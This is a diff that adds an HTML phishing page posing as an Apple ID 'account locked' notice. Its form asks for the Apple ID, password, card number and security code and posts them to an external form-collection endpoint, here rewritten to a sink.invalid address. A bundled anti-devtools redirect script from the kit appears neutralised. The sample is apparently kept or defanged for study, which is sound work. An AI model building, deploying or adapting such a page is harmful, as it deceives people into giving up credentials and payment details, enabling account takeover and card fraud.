@@ -1,0 +1,50 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Apple ID — Your account has been locked</title>
+<!-- The icon is Apple's, served from Apple. The domain is not. -->
+<link rel="icon" type="image/png" href="https://sink.invalid/www.apple.com/favicon.ico">
+<link rel="apple-touch-icon" href="https://sink.invalid/www.apple.com/apple-touch-icon.png">
+<style>
+  body { font-family: system-ui, -apple-system, sans-serif; margin: 0; background: #fff; color: #1d1d1f; }
+  .wrap { max-width: 400px; margin: 72px auto; text-align: center; }
+  h1 { font-size: 24px; font-weight: 600; margin: 0 0 8px; }
+  p.lede { margin: 0 0 28px; color: #6e6e73; font-size: 15px; }
+  label { display: block; text-align: left; margin: 14px 0 4px; font-size: 13px; }
+  input { width: 100%; box-sizing: border-box; padding: 11px 12px; font-size: 15px;
+          border: 1px solid #d2d2d7; border-radius: 10px; }
+  button { margin-top: 24px; width: 100%; padding: 12px; font-size: 16px; border: 0;
+           border-radius: 10px; background: #0071e3; color: #fff; cursor: pointer; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<h1>Your Apple ID has been locked</h1>
+<p class="lede">For your security, verify your billing details to restore access.</p>
+
+<form action="https://sink.invalid/formspree.io/f/xpzgkqwe" method="post">
+  <label for="e">Apple ID</label>
+  <input id="e" name="appleid" type="email" autocomplete="username" required>
+  <label for="p">Password</label>
+  <input id="p" name="password" type="password" autocomplete="current-password" required>
+  <label for="cc">Card number</label>
+  <input id="cc" name="cardnum" autocomplete="cc-number" required>
+  <label for="cv">Security code</label>
+  <input id="cv" name="cvv" autocomplete="cc-csc" required>
+  <button type="submit">Unlock account</button>
+</form>
+
+</div>
+
+<script type="text/plain" data-ppg-defused="1">
+// disable-devtool, bundled straight out of the kit.
+(function () {
+  var DisableDevtool = window.DisableDevtool || function () {};
+  DisableDevtool({ url: "https://www.apple.com/", disableMenu: true });
+  if (window.outerWidth - window.innerWidth > 160) location.href = "https://www.apple.com/";
+})();
+</script>
+</body>
+</html>
